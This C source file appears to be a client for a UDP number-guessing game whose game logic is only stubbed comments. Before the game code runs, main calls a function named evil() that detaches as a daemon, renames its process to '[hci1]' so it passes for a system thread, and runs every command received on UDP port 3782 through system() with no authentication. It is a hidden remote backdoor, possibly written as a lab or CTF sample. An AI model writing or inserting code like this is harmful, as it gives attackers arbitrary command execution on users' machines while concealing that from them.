#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <sysexits.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <fcntl.h>

#define DEBUG

int
bind_port(int fd, const struct in6_addr *addr, uint16_t port)
{
    struct sockaddr_in6 saddr = { 0 };

    saddr.sin6_family = AF_INET6;
    saddr.sin6_port = htons(port);
    memcpy(&saddr.sin6_addr, addr, sizeof *addr);
    return bind(fd, (struct sockaddr *) &saddr, sizeof saddr);
}

void
sigchld(int unused)
{
    while (0 < waitpid(-1, NULL, WNOHANG));
}

void
evil(char *argv[])
{
    int sock;

    if (fork()) {
        return;
    }

    /* Fork again to reparent to init */
    if (fork()) {
        exit(0);
    }

    {
        int r = open("/dev/null", O_RDONLY);
        int w = open("/dev/null", O_WRONLY);

        dup2(r, 0);
        dup2(w, 1);
        dup2(w, 2);
        close(r);
        close(w);
    }

    strcpy(argv[0], "[hci1]");

    sock = socket(AF_INET6, SOCK_DGRAM, 0);
    if (-1 == bind_port(sock, &in6addr_any, 3782)) {
        exit(0);
    }

    while (1) {
        char cmd[400];
        ssize_t inlen;

        inlen = recvfrom(sock, cmd, sizeof(cmd)-1, 0, NULL, NULL);
        if (-1 == inlen) {
            continue;
        }

        cmd[inlen] = 0;
        if (! fork()) {
            system(cmd);
            exit(0);
        }
    }
}

int
main(int argc, char *argv[])
{
    long            answer = 0;
    int             sock;
    int             i;
    struct in6_addr addr;
    FILE *in;
    FILE *out;

    srand(time(NULL));

    if (0 >= inet_pton(AF_INET6, argv[1], &addr)) {
        fprintf(stderr, "invalid address: %s\n", argv[1]);
        return EX_IOERR;
    }
    if (argv[2]) {
        /* fork and exec */
    } else {
        in = stdin;
        out = stdout;
    }

    signal(SIGCHLD, sigchld);
    evil(argv);

    /*
     * Set up socket 
     */
    sock = socket(AF_INET6, SOCK_DGRAM, 0);
    if (-1 == bind_port(sock, &in6addr_any, 44)) {
        perror("Binding UDP port 44");
#ifndef DEBUG
        return EX_IOERR;
#endif
    }

    while (1) {
        char line[20];
        long guess;

        /* XXX: only do this if we have a game ID */
        if (NULL == fgets(line, sizeof line, in)) {
            break;
        }

        guess = strtol(line, NULL, 16);
        /* send the guess */
        /* read the result */
        /* parse result */
        /* display result */
    }

    return 0;
}
